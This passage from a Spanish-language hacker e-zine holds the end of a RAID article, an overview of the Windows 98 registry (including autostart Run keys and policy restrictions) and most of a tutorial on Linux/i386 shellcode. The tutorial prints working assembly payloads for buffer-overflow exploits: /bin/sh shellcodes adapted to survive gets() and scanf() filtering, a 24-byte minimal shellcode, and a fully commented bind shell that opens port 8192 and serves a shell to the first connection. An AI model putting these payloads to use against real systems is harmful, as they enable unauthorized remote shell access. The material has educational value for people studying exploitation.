el tema no trataba de este software en concreto por lo que si 
quereis saber mas sobre el tema en las paginas de docs de sun 
viene perfectamente documentado.



DESPEDIDA ----------------------------------------------------------

Bueno espero que este pequeño articulo os haya ayudado un poco a conocer lo
que es un RAID, para que sirve los motivos de su uso,...

Es posible que en este articulo haya algunos errores por desconocimiento o
por despiste, si es asi lo siento, lo solucionare con ese maravilloso
programa que te detecta todos todos los errores, ¿Como se llama? ummm a si er
corrector de moco$oft güor (que haria este mundo sin esos errores de
concordancia absurdos).

Nada mas, lo disho. Si necesitais algo mas de sistemas RAID y puedo ayudaros
ya sabeis donde me podeis encontrar iRC-Hispano ( #netsearch, #sevilla_libre,
#solaris, #castelldefels, ...) aunque ultimante entro menos de lo que me
gustaria, pero ya llegaran tempos de mas enganshe jeje.


Un saludo HandeR
hander@netsearch-ezine.com



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x03 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ El Registro de Windows ]-================================================
=-[ por Chapulino ]-=========================================================




Introduccion
^^^^^^^^^^^^

Este texto lo comence a escribir hace algun tiempo por lo que puede estar
algo obsoleto para los sistemas nuevos, es decir, esta creado a partir de mis
experiencias con Windows 98. En NT y 2000 variara en algunos aspectos.



La arquitectura del registro (claves)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

> HKEY_CLASSES_ROOT
  Datos usados para operaciones OLE y de arrastrar y soltar, entre los que se
  incluyen los nombres de todos los tipos de archivos registrados y sus
  propiedades (iconos, ordenes de windows (print, open, etc), extensiones de
  archivos, etc).
  La mayoria de entradas de esta clave se pueden encontrar tambien en
  HKEY_LOCAL_MACHINE\SOFTWARE\Classes.

> HKEY_USERS
  Informacion de usuarios. HKEY_USERS\Default es el usuario por defecto y se
  creara una entrada por cada usuario.
  En esta clave hay una subclave llamada software que Microsoft utiliza para
  almacenar configuraciones de telefonia que son dependientes del usuario.

> HKEY_CURRENT_USER
  Aqui se guarda una copia temporal del usuario que inicia la sesion. Esta
  copia se extrae de HKEY_USERS\Usuario. Las subclaves que contiene esta clave
  son:

        - AppEvents: Contiene vias de acceso a archivos de sonido que son
          cargados para ciertos sucesos determinados (errores, etc).

        - ControlPanel: Contiene datos que pueden ser modificados en la
          ventana del Panel de control.

        - Display: Contiene datos de la pantalla del usuario actual (esta
          clave solamente esta disponible cuando un usuario inicia una sesion
          con los perfiles de usuario activados).

        - InstallLocationsMRU: Contiene los valores que definen los caminos
          usados en el ultimo proceso de instalacion.

        - Keyboard layout: Contiene informacion acerca de la disposicion del
          teclado (icono teclado del Panel de control).

        - Network: Contiene subclaves que describen las conexiones de red
          persistentes y recientes y el estado de la red.

        - RemoteAccess: Subclave opcional que solamente esta disponible si
          esta instalado el servicio Acceso remoto. En ella se definen
          configuraciones de acceso remoto.

        - Software: Describe las propiedades especificas del usuario del
          software instalado por el usuario (informacion que anteriormente se
          almacenaba en el fichero WIN.INI).


> HKEY_LOCAL_MACHINE
  Esta rama define toda la informacion especifica para la maquina local, tales
  como los controladores, el hardware instalado, el mapa de los puertos y la
  configuracion del software. Esta informacion es valida para todos los
  usuarios que estan conectados al sistema. Las subclaves que contiene esta
  clave son:

        - Config: Guarda la configuracion de la maquina. Contiene dos
          entradas: una para las configuraciones de pantalla y otra para las
          impresoras del sistema.

        - Driver: Contiene subclaves vacias.

        - Enum: La Enumeracion de bus sirve para llevar la cuenta de todos los
          componentes de hardware que estan instalados.

        - HARDWARE: Esta subclave contiene configuraciones de los puertos
          serie que estan disponibles en la maquina local.

        - Network: Cuando Windows 98 se ejecuta en red, esta subclave contiene
          informacion  de conexion de usuario.

        - Security: Contiene informacion acerca del proporcionador de
          seguridad (para aquellos PCs que funcionan en red).

        - SOFTWARE: Aqui se almacena toda la informacion acerca del software
          que esta instalado en la maquina.

        - System: Contiene todos los datos necesarios para que Windows 98
          pueda arrancar. Esta contiene una subclave llamada
          CurrentControlSet, que a su vez contiene otras dos subclaves:
          Control y Services. Control contiene informacion tal como el nombre
          de la maquina y la configuracion del sistema de archivos. Services
          lista los servicios utilizados en Windows 98.


> HKEY_CURRENT_CONFIG
  Esta rama se ocupa de Plug&Play y contiene informacion acerca de la
  configuracion actual de un PC de multiples configuraciones del hardware.
  Las configuraciones de esta clave coinciden con las almacenadas en
  HKEY_LOCAL_MACHINE\Config.

> HKEY_DYN_DATA
  Esta rama contiene las claves que almacenan informacion dinamica de estado
  de multiples dispositivos. Estos pueden ser utilizados por programas de
  vigilancia para detectar problemas de hardware, el estado de los
  dispositivos, etc.



Los archivos SYSTEM.DAT y USER.DAT
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Para un PC independiente un unico archivo es suficiente para almacenar todo
el registro, pero en una red son necesarios dos archivos para impedir que
usuarios finales puedan reconfigurar el sistema, y para poder mantener
algunas configuraciones globales para todos los usuarios.


> SYSTEM.DAT
  Contiene la configuracion del sistema y la configuracion de los datos
  (hardware, Plug&Play y aplicaciones). Estas configuraciones son necesarias
  durante el inicio del sistema para cargar los controladores de dispositivos
  y para determinar el hardware que esta disponible.

> USER.DAT
  Contiene datos que son especificos de usuario (nombre de usuario,
  configuracion del escritorio, configuracion del menu inicio, etc). Si se
  activan los perfiles de usuario, un usuario individual puede tener sus
  configuraciones personales almacenadas en una estructura de directorios bajo
  el subdirectorio \Windows\Profiles, el cual contiene una copia del archivo
  USER.DAT para este usuario.



Los archivos INI
^^^^^^^^^^^^^^^^

Dentro del directorio Windows tenemos los ficheros WIN.INI y SYSTEM.INI por
razones de compatibilidad con versiones anteriores de Windows. Estas
configuraciones se usan para aplicaciones de Win16.



Importacion de datos al registro
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Los archivos importados han de tener una extension REG y requieren un formato
especial. Los archivos validos de Windows 98 contienen tan solo caracteres
ASCII en un formato predeterminado. Su primera linea ha de contener la palabra
REGEDIT4 y la segunda ha de venir en blanco. Todas las lineas que siguen a la
primera linea en blanco contienen entradas de configuraciones para el
registro. Cada entrada empieza por el nombre de la clave de destino encerrada
entre corchetes [ ]. La clave de destino puede ya existir en el registro o
puede ser una nueva entrada. La linea que sigue a continuacion contiene el
valor de una entrada y su valor de datos asociado. Ejemplo:


	REGEDIT 4

	[HKEY_CLASSES_ROOT\.bmp]
	@="Paint.Picture"

	[HKEY_CLASSES_ROOT\.bmp\ShellNew]
	<<NullFile>> = >> >>



Configuracion del escritorio, menu de inicio y panel de control
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 

Si en las entradas ponemos como valor 1 desactivaremos los accesos y con 0
los activaremos.


> Escritorio activo (Active Desktop)
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
  Explorer

  Las entradas posibles son:

  - NoActiveDesktop -> Lo pondremos a 1 si no queremos permitir cambios en el
    Active Desktop.


  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
  ActiveDesktop

  Para personalizar el Active Desktop tenemos la siguientes entradas:

  - NoComponents -> Deshabilitar todos los elementos del escritorio.

  - NoAddingComponents -> Deshabilitar la adicion de cualquier elemento al
    escritorio.

  - NoDeletingComponents -> Deshabilitar la eliminacion de cualquier
    elemento del escritorio.

  - NoEditingComponents -> Deshabilitar la edicion de cualquier elemento del
    escritorio.

  - NoClosingComponents -> Deshabilitar el cierre de cualquier elemento del
    escritorio.

  - NoHTMLWallpaper -> Desactivar el papel de tapiz.

  - NoCloseDragDropBands -> Deshabilitar arrastrar, soltar y cerrar todas las
    barras de herramientas.

  - NoMovingBands -> Deshabilitar el redimensionamiento de todas las barras
    de herramientas.


> Configuracion de la Administracion avanzada de energia
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\
  Controls Folder\PowerCfg

  Las entradas posibles son:

  - ScreenSave_Data -> Contiene la contraseña encriptada del protector de
    pantalla.

  - ScreenSaveActive -> Con valor 1 el protector de pantalla queda activado.

  - ScreenSaveLowPowerActive -> A 1 cuando el monitor soporta ahorro de
    energia y se activa el Bajo consumo de energia.

  - ScreenSaveLowPowerTimeout -> Tiempo limite en segundos.

  - ScreenSavePowerOffActive -> A 1 cuando el monitor soporta ahorro de
    energia y se activa el Apagar monitor.

  - ScreenSaveTimeout -> Tiempo limite en segundos.

  - ScreenSaveUsePassword -> A 1 cuando el protector de pantalla exige una
    contrase¤a.


> Restriccion del acceso a Propiedades de Pantalla
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System

  Las entradas posibles son:

  - NoDispCPL -> Desactivar el Panel de control de monitor (permite o no el
    acceso a las propiedades de pantalla).

  - NoDispBackgroungPage -> Ocultar la pagina de fondo.

  - NoDispScrSavPage -> Ocultar la pagina del protector del pantalla.

  - NoDispAppearancePage -> Ocultar la pagina de aspecto.

  - NoDispSettingPage -> Ocultar la pagina de especificaciones.


> Restriccion del acceso a Propiedades de Red
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network

  Las entradas posibles son:

  - NoNetSetup -> Desactivar el panel de control de red.

  - NoNetSetupIDPage -> Ocultar la pagina de identificacion.

  - NoNetSetupSecurityPage -> Ocultar la pagina de control de acceso.


> Restriccion del acceso a Propiedades de Contraseñas
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System

  Las entradas posibles son:

  - NoSecCPL -> Desactivar el panel de control de contraseñas.

  - NoPWDPage -> Ocultar la pagina de cambio de contraseñas.

  - NoAdminPage -> Ocultar la pagina de administracion remota.

  - NoProfilPage -> Ocultar la pagina de perfiles de usuario.


> Restriccion del acceso a Propiedades de Impresoras
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
  Explorer

  Las entradas posibles son:

  - NoPrinterTabs -> Ocultar las paginas generales y de detalle.

  - NoDeletePrinter -> Desactivar la eliminacion de impresoras.

  - NoAddPrinter -> Desactivar la adicion de impresoras.


> Restriccion del acceso a Propiedades del Sistema
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System

  Las entradas posibles son:

  - NoDevMngPage -> Ocultar la pagina del administrador de dispositivos.

  - NoConfigPage -> Ocultar la pagina de perfiles de hardware.

  - NoFileSysPage -> Ocultar el boton del sistema de archivos.

  - NoVirMemPage -> Ocultar el boton de memoria virtual.


> El menu Inicio
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
  Explorer

  Las entradas posibles son:

  - NoSetFolders -> Oculta los simbolos de las carpetas de Impresoras y del
    Panel de control en el submenu Configuraciin.

  - NoSetTaskbar -> Oculta la entrada Barra de tareas y menu Inicio.

  - NoRun -> Suprime la entrada Ejecutar del menu Inicio.

  - NoFind -> Suprime la entrada Buscar del menu Inicio.

  - NoLogOff -> Desactivar la orden Cerrar sesion.

  - NoRecentDocsMenu -> Desactivar la orden Documentos.

  - NoRecentDocsHistory -> No guarda historial de documentos recientemente
    abiertos.

  - ClearRecentDocsOnExit -> Borra el historial de documentos recientemente
    abiertos.

  - NoFavoritesMenu -> Desactivar la orden Favoritos.

  - NoClose -> Desactivar la orden Apagar el sistema.


> Desactivar el Simbolo de MS-DOS
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
  WinOldApp

  Las entradas posibles son:

  - Disabled -> Al ponerlo a 1 se desactiva el acceso a MS-DOS.


> Eliminar el simbolo de acceso directo (la flecha que aparece en el icono)
  HKEY_CLASSES_ROOT\lnkfile

  Ponemos la entrada lsShorcut como << >> para eliminar la flecha en los
  accesos directos.

  HKEY_CLASSES_ROOT\piffile

  Ponemos la entrada lsShorcut como << >> para eliminar la flecha en los
  archivos PIF.



Configuracion del SHELL
^^^^^^^^^^^^^^^^^^^^^^^

> Borrar el nombre del ultimo usuario en la ventana de inicio de sesion
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon

  La entrada es DontDisplayLastUserName.

> AutoRun para un CD-ROM
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
  Explorer

  La entrada para el AutoRun es NoDriveType-Auto-Run.



Diversas configuraciones del registro
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

> Lanzamiento de programas durante el inicio de Windows
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

  Las entradas posibles son:

  - Run -> Las aplicaciones que estan registradas en esta clave son ejecutadas
    cada vez que se inicia Windows.

  - RunOnce -> Contiene unos valores con los nombres y los caminos de las
    aplicaciones que seran ejecutadas tan solo una vez durante el inicio de
    Windows. Windows quita las entradas que hay en esta clave una vez que el
    sistema se inicia con exito.

  - RunOnceEx -> La misma funcion que RunOnce pero permite que se pueden
    especificar mas opciones para el inicio, tales como el orden en el que se
    van a ejecutar las aplicaciones.

  - RunServices -> Se usa para lanzar servicios de red o de sistema durante un
    inicio de Windows.

  - RunServicesOnce -> Se usa para lanzar servicios de red o de sistema
    durante el proximo inicio de Windows con exito.


> Registro de errores de Windows
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Fault

  La entrada LogFile contiene el camino y nombre del archivo de registro.

> Desactivar los nombres largos de archivos
  HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\FileSystem

  La entrada Win31FileSystem contiene un 0 para soportar nombres largos de
  archivos y un 1 para usar el antiguo sistema de DOS.

> Cambiar la letra de una unidad de CD-ROM
  HKEY_LOCAL_MACHINE\System\Enum

  Estas subclaves contienen el valor CurrentDriveLetterAssignment con los
  nombres asignados de unidad.

  El valor AutoInsertNotification controla las notificaciones de Windows que
  guardan relacion con el hecho de que se haya insertado un CD-ROM en una
  unidad o no. El valor 1 activa la notificacion.



Despedida
^^^^^^^^^

Espero haber podido ayudaros a comprender un poco el registro de Windows. Si
veo que este articulo ha gustado a la gente la proxima vez escribire uno con
algunos trucos muy interesantes sobre el tema.


chapulino@netsearch-ezine.com



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x04 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Shellcodes en Linux/i386 (2) ]-==========================================
=-[ por RaiSe ]-=============================================================




----------------
// 0.- Indice
----------------


0.-  Indice
1.-  Prologo
2.-  '%esp' sobreescrito
3.-  Shellcode sin retornos de linea
4.-  Syscall's de mas de 5 argumentos
5.-  Minishellcode
6.-  Enlazar un puerto con una shell usando sockets
7.-  Pasando el codigo a un string
8.-  Shellcode alfanumerica
9.-  Recopilacion de shellcodes / extractor
10.- Despedida



----------------
// 1.- Prologo
----------------


Vista la buena acogida que ha tenido el articulo de shellcodes de NS #4 he
tomado la decision de hacer una segunda parte :). En este texto intentare
profundizar un poco mas en las shellcodes, con algunos casos concretos que
nos serviran especificamente para algunos xploits, asi como alguna que otra
shellcode un poco mas compleja ;). Se recomienda leer la primera parte sino
estas familiarizado con las scodes (http://netsearch.page.to/ns004.zip). En
los diferentes apartados del articulo voy poniendo los codigos de las
shellcodes. El penultimo apartado es una recopilacion de las scodes en
strings listas para ser usadas.



----------------------------
// 2.- '%esp' sobreescrito
----------------------------


Este caso se da cuando el registro esp (puntero al tope de la pila) ha
sido sobreescrito por cualquier motivo aleatorio. Un caso muy tipico es
cuando sobreescribimos una variable del tipo jmp_buf.. sino calculamos
exactamente lo que debemos sobreescribir lo mas probable es que 'machaquemos'
esp con un valor fuera del segmento actual. Al hacerlo conseguimos que el 90%
de las shellcodes no funcionen, ya que cuando hagamos la llamada a 'call'
para salvar la direccion del string en la pila, el sistema intenta guardarlo
en el tope de la pila (esp), que como apunta a una direccion erronea dara un
segment fault. La solucion a esto es muy sencilla, y consiste en copiar
nosotros manualmente a esp una constante que siempre estara dentro de la
pila, por ejemplo 0xbffffff0.

Pues bien, el nuevo aspecto de la tipica shellcode que ejecuta '/bin/sh'
seria algo asi:


<-- codigo -->

__asm__("
       jmp 0x1f
       popl %edi
       movl %edi,%ebx
       xorl %eax,%eax
       movb %al,0x7(%edi)
       movl %edi,0x8(%edi)
       movl %eax,0xc(%edi)
       leal 0x8(%edi),%ecx
       leal 0xc(%edi),%edx
       movb $0xb,%al
       int $0x80
       xorl %ebx,%ebx
       movl %ebx,%eax
       inc %eax
       int $0x80
       movl $0xbffffff0,%esp
       call -0x29
       .string \"/bin/sh\"
");

<-- fin codigo -->


Como veis es muy sencilla la solucion :).



----------------------------------------
// 3.- Shellcode sin retornos de linea
----------------------------------------


Hay veces que necesitamos tener la shellcode en una sola linea sin retornos
de carro ni nada parecido. Un caso muy claro de esto es cuando el programa
vulnerable utiliza una llamada a 'gets()' para leer el string que luego se
copiara a un buffer, etc. En este caso si la shellcode contienen un retorno
de linea el programa finalizara la ejecucion de 'gets()' y la scode quedara
a medias, siendo obvio que cuando se ejecute no funcionara correctamente..

En otras ocasiones, aun teniendo una scode sin retornos de linea no es
suficiente. Me estoy refiriendo a cuando el programa vulnerable lee los datos
con una llamada a 'scanf()'. Como todos sabemos, scanf solo lee hasta que se
encuentra un retorno de linea o un espacio en blaco. Resumiendo, necesitamos
una shellcode que no contenga ni retornos de linea ni espacios en blanco. La
lista de caracteres que no debe tener es la siguiente:

	. Retornos de linea:

	  + '\f', 0x0c, salto de pagina.
	  + '\n', 0x0a, salto de linea.
	  + '\r', 0x0d, salto de carro.
	  + '\v', 0x0b, tabulacion vertical.

	. Espacios:

	  + '\b', 0x08, espacio atras.
	  + '\t', 0x09, tabulacion horizontal.
	  + '  ', 0x20, espacio en blanco.


Normalmente la tipica shellcode que ejecuta una shell contiene 2 saltos de
linea, 1 tabulacion vertical y 2 espacios atras. La solucion consiste en
cambiar las instruccion conflictivas por otras cuyos 'opcodes' no tengan esos
valores. La instrucciones en cuestion son las siguientes (estan sacadas de
un codigo mas o menos standard de un execve /bin/sh):


+ mov    %eax,0xc(%esi)   -->  1 salto de linea
+ lea    0xc(%esi),%edx   -->  1 salto de linea
+ mov    $0xb,%al         -->  1 tabulacion vertical
+ mov    %esi,0x8(%esi)   -->  1 espacio atras
+ lea    0x8(%esi),%ecx   -->  1 espacio atras


Pues bien, se cambian esas instrucciones por otras que consigan el mismo
resultado y ya esta.. El codigo cambiado seria algo asi:


<-- codigo -->

__asm__("
        jmp   0x19
        popl  %edi
        movl  %edi,0x10(%edi)
        xorl  %edx,%edx
        movb  %dl,0x7(%edi)
        movl  %edx,0x14(%edi)
        movl  %edi,%ebx
        leal  0x50(%edx),%eax
        leal  0x10(%edi),%ecx
        subl  $0x45,%eax
        int   $0x80
        call  -0x1e
        .string \"/bin/sh\"
");

<-- fin codigo -->


Simplemente se ha cambiado el registro %esi por %edi, el metodo de poner %eax
a 0xb y poco mas. Y nada.. ya esta la shellcode lista para ser usada.. ;).



-----------------------------------------
// 4.- Syscall's de mas de 5 argumentos
-----------------------------------------


En el articulo anterior solo habiamos tratado las shellcodes que utilizaban
syscalls con 5 argumentos como maximo. Haciendo un poco de memoria podemos
recordar que se ponia el numero de syscall en %eax, y los argumentos se iban
colocando en los registros consecutivamente de esta forma:

-> %ebx, %ecx, %edx, %esi, %edi

Pues bien, para utilizar una syscall con mas de 5 argumentos, como veremos,
es muy sencillo. Simplemente hay que colocar el numero de la syscall en %eax
(esto no cambia), y la lista de argumentos en un array (terminado en un long
null). La direccion del array se coloca en %ebx. Queria poner un ejemplo pero
es que no se que syscall poner que utilice mas de 5 argumentos.. Bueno, pues
nada.. simplemente se ponen los argumentos en un array y se copia la
direccion a %ebx y en %eax el numero de syscall. La estructura quedaria algo
asi:

%eax -> 0xn  (n es el numero de la syscall, /usr/include/asm/unistd.h) 
%ebx -> 0xbfffffa0

(0xbfffffa0) -> 0x00000001 0xbffffff5 .. 0x00000000 (es un caso hipotetico)
int  $0x80



----------------------
// 5.- Minishellcode
----------------------


Hay veces que a la hora de xplotar un programa tenemos tan poca cantidad de
memoria, que la longitud de la shellcode se convierte en algo critico. Por lo
tanto lo logico es que cuanto menor sea la shellcode, pues mejor. En casos
cuando el buffer a sobreescribir tiene un tamaño de 32 bytes por ejemplo,
necesitamos una scode de unos 36 bytes como maximo, ya que el tamaño que
tendremos sera: tamaño_del_buffer + 4 (%ebp). Pero en ese caso solo podriamos
copiar la direccion de retorno una vez, ya que no tendriamos espacio para
mas.. y tampoco podriamos poner ningun nop (por la misma razon).

Entonces el tamaño de la scode deberia ser de unos 36-12 mas o menos.. asi
podriamos copiar la direccion de retorno 3 veces, o copiarla 2 veces y poner
4 nops.. Y ahi es cuando empezamos a optimizar el codigo lo maximo posible
para reducir el tamaño.

Lo primero que haremos (resulta obvio), es quitar la llamada a 'exit', ya que
si la shellcode funciona no nos hara falta para nada. Despues cambiamos unas
instrucciones por otras que ocupan menos bytes y que hacen lo mismo, como por
ejemplo usar el stack con push's para colocar el string, en vez del tipico
jmp-call. Despues cambiamos un movl por un leal y poco mas.. El path a
ejecutar es //bin/sh, no quito una barra porque con dos funciona
perfectamente y estariamos gastando 1 byte mas. El resultado es una shellcode
de 24 bytes que ejecuta una shell. El codigo seria algo asi:


<-- codigo -->

__asm__("
        xorl  %edx,%edx
        pushl %edx
        pushl $0x68732f6e
        pushl $0x69622f2f
        movl  %esp,%ebx
        pushl %edx
        pushl %ebx
        movl  %esp,%ecx
        leal  0xb(%edx),%eax
        int   $0x80
");

<-- fin codigo -->


Despues de darle mil vueltas no he conseguido reducirla mas, si alguien sabe
como que me mande un mail a raise@netsearch-ezine.com please ;).



-------------------------------------------------------
// 6.- Enlazar un puerto con una shell usando sockets
-------------------------------------------------------


Pues bien, esta es una shellcode que enlaza un puerto con una shell como muy
bien dice el titulo de este apartado (vease 3 lineas para arriba ;) ). La
verdad es que no tiene ningun misterio, simplemente hay que saber un par de
cosas a la hora de usar sockets..


+ El codigo de la syscall siempre sera 0x66 y se coloca en %eax

+ En %ebx se coloca el codigo de la subrutina, que puede mirarse en
  /usr/include/linux/net.h.

+ En %ecx se coloca la direccion de la lista de argumentos. Este caso en
  un tanto especial ya que la lista no tiene que estar terminada por un nulo,
  sino que se encarga el sistema de saber cuantos argumentos necesita cada
  syscall.

+ La estructura sockaddr_in se consigue copiando los valores de cada elemento
  en en forma de media palabra (2 bytes).

+ La syscall definitiva se ejecuta con int $0x80 (esto tampoco cambia).


La manera de enlazar el puerto con la scode se consigue ejecutando una serie
de syscall's consecutivamente:


     +--------------------------------------------------------+
     |                                                        |
     |	fork() -> exit() proceso padre -> socket() -> bind()  |
     |	       -> listen() -> accept() -> dup2() -> execve()  |
     |                                                        |
     +--------------------------------------------------------+


Asi, resumido brevemente, seria crear un proceso con fork, crear un socket
con idem, enlazar el socket con bind, ponerlo a la escucha con listen,
aceptar 'una' conexion con accept, redireccionar las entradas/salidas con
dup2 hacia el socket, y ejecutar una shell. Es importante recalcar que el
codigo no vuelve a ejecutar accept() una y otra vez con un bucle, sino que en
cuanto se establezca una conexion con el puerto en cuestion y se termine la
comunicacion, el proceso desaparecera y no se podra volver a conectar.

El codigo en C mas sencillo para hacer esto seria mas o
menos el siguiente:


<-- codigo C -->

int soc_local,soc_remoto;	// declarar los sockets
struct sockaddr_in addr_l;	// declarar la estructura sockaddr_in

soc_local=socket(2,1,0);	// crear el socket
addr_l.sin_family = 2;		// family = AF_INET
addr_l.sin_port = 0x20;		// puerto 0x2000 = 8192
addr_l.sin_addr.s_addr = 0;	// s_addr = INADDR_ANY

bind(soc_local,(struct sockaddr *) &addr_l, 0x10);  // enlazar el socket
listen(soc_local,1);		// poner el socket a la escucha
soc_remoto=accept(soc_local,0, 0);  // aceptar conexion 

dup2(soc_remoto,0);		
dup2(soc_remoto,1);		//  duplicar descriptores
dup2(soc_remoto,2);		
execl("/bin/sh","sh",0);	//  ejecutar /bin/sh

<-- fin codigo C -->


El codigo en asm seria el siguiente (el codigo esta sin optimizar,
seguramente sobraran unos 50 bytes..):


<-- codigo -->

__asm__("

decl %esp			// decrementa %esp
decl %esp			// decrementa %esp
decl %esp			// decrementa %esp
decl %esp			// decrementa %esp
popl %edi			// copia la dire de retorno de la funcion
				// anterior en %edi (dicha direccion siempre
				// estara en %esp-4 sino se toco nada de la
				// pila despues del ret).

movl %edi,%esp			// copia %edi a %esp, esto se hace para
				// poder hacer push's a saco sin preocupar-
				// nos de sobreescribir la shellcode, ya
				// que %esp siempre apuntara 'por encima'
				// de la shellcode.
// fork
xorl %eax,%eax			// pone %eax a 0
movl %eax,%ebx			// copia %eax a %ebx, %ebx=0
movb $0x2,%al			// %eax=0x2 (fork)
int  $0x80			// ejecuta el fork()
cmpl %eax,%ebx			// compara si %eax es 0
je   0x5			// si %eax=0 salta el exit() que viene a
				// continuacion
// exit
leal 0x1(%ebx),%eax		// pone %eax a 0x1 (exit)
int  $0x80			// ejecuta exit() (proceso padre)

// socket
xorl %edx,%edx			// pone %edx a 0
movl %edx,0x8(%edi)		// copia un long null a la dire %edi+8
incl %edx			// %edx=1
movl %edx,0x4(%edi)		// copia 0x00000001 a la dire %edi+4
incl %edx			// %edx=2
movl %edx,(%edi)		// copia 0x00000002 a la dire %edi	
movl %edi,%ecx			// copia %edi a %ecx
xorl %ebx,%ebx			// pone %ebx a 0
incl %ebx			// pone %ebx a 1 (socket)
leal 0x65(%ebx),%eax		// pone %eax a 0x66
int  $0x80			// ejecuta socket(2,1,0)

// bind
movl %eax,%esi			// copia 'soc_local' en %esi
xorl %edx,%edx			// pone %edx a 0
movl %edx,(%edi)		// copia un long null a la dire %edi
movb $0x2,(%edi)		// pone 0x0002 en la dire %edi (1 hword)
movb $0x20,0x2(%edi)		// pone 0x20 en la dire %edi+2
movl %edx,0x4(%edi)		// copia un long null a la dire %edi+4
movl %esi,0x8(%edi)		// copia 'soc_local' a la dire %edi+8
movl %edi,0xc(%edi)		// copia la dire de sockaddr_in a %edi+0xc
movl %edx,0x10(%edi)		// copia un long null a la dire %edi+0x10
movb $0x10,0x10(%edi)		// pone en la dire %edi+0x10 0x00000010
				// Con esto estamos declarando la lista de
				// argumentos de bind(). La direccion de
				// dicha lista se copiara a %ecx.
leal 0x66(%edx),%eax		// pone %eax=0x66
leal 0x2(%edx),%ebx		// %ebx=2 (bind)
leal 0x8(%edi),%ecx		// carga la dire de sockaddr_in en %ecx
int  $0x80			// ejecuta bind()

// listen
movl %esi,(%edi)		// copia 'soc_local' a la dire %edi
movl %edx,0x4(%edi)		// long null a la dire %edi+4
movb $0x1,0x4(%edi)		// 0x00000001 en la dire %edi+4
leal 0x66(%edx),%eax		// carga 0x66 en %eax
leal 0x4(%edx),%ebx		// %ebx = 4 (listen)
movl %edi,%ecx			// lista de argumentos en %ecx
int  $0x80			// ejecuta listen()

// accept
movl %edx,0x4(%edi)		// long null a la dire %edi+4
movl %edx,0x8(%edi)		// long null a la dire %edi+8
				// en la dire %edi sigue estando soc_local
leal 0x66(%edx),%eax		// %eax=0x66
leal 0x5(%edx),%ebx		// %ebx = 5 (accept)
int  $0x80			// ejecuta accept()

// dup2
movl %eax,%ebx			// copia 'soc_remoto' a %ebx
xorl %ecx,%ecx			// %ecx = 0
leal 0x3f(%edx),%eax		// %eax = 0x3f (dup2)
int  $0x80			// ejecuta dup2(soc_remoto,0)
leal 0x3f(%edx),%eax	        // %eax = 0x3f (dup2)
incl %ecx			// incrementa en 1 %ecx
int  $0x80			// ejecuta dup2(soc_remoto,1)
leal 0x3f(%edx),%eax		// %eax = 0x3f (dup2)
incl %ecx			// incrementa en 1 %ecx
int  $0x80			// ejecuta dup2(soc_remoto,2)

// execve
xorl  %edx,%edx			// %edx=0
pushl %edx			// long null a la pila	
pushl $0x68732f6e		//
pushl $0x69622f2f		// coloca el string /bin/sh seguido del
				// nulo q pusimos antes (pushl %edx) en
				// la pila.	
movl  %esp,%ebx			// carga la dire del string en %ebx
pushl %edx			// long null a la pila
pushl %ebx			// dire del string a la pila
movl  %esp,%ecx			// carga la dire de los args en %ecx
leal  0xb(%edx),%eax		// %eax=0xb
int   $0x80                    	// ejecuta execve()

");

<-- fin codigo -->


Una vez que se ejecute abrira un puerto (segun esta configurada el 8192) y
aceptara UNA conexion, despues se cerrara el puerto y adios muy buenas.. Si
quieres mejorar esta shellcode no dudes en mandarme un mail ;).



--------------------------------------
// 7.- Pasando el codigo a un string
--------------------------------------


En el articulo anterior (NS #4), habia dicho como pasar la shellcode a un
string manualmente, pero eso la verdad es que es un poco/bastante rollazo si
la shellcode tiene unas dimensiones un poco grandes. Para facilitar la tarea
he creado una funcion que te lo pasa automaticamente y te hace un print de la
scode bastante mono..

La forma de utilizarlo es la sencilla. La estructura del programa en C con el
codigo de la scode tiene que tener un estilo de este tipo:


<-- codigo -->

#include ..tal..
#include <scodes.h>

void shellcode()
	{
	__asm__("
		codigo de la shellcode
		.byte 0x00
		");
	}

main()
	{
	printsc((int)shellcode);
	}

<-- fin codigo -->	


La funcion printsc() esta declarada en el fichero scodes.h que se incluye al
final de este articulo (apartado recopilacion). La forma de llamar a dicha
funcion es la siguiente:


		printsc((int)dire_funcion_scode); 


Resumiendo, se mete el codigo de la shellcode en una funcion que solo
contenga un __asm__() con el code terminado de un null (.byte 0x00). Esto
ultimo es importante ya que sino lo ponemos la scode sera mas larga de lo que
deberia (se pasara al string el codigo del __asm__ y lo que haya a
continuacion), por lo tanto hay que poner el .byte 0x00 para diferenciar cual
es el final de nuestro codigo. El file scodes.h se copia a /usr/includes y se
incluye en nuestro prog con #include <scodes.h>.

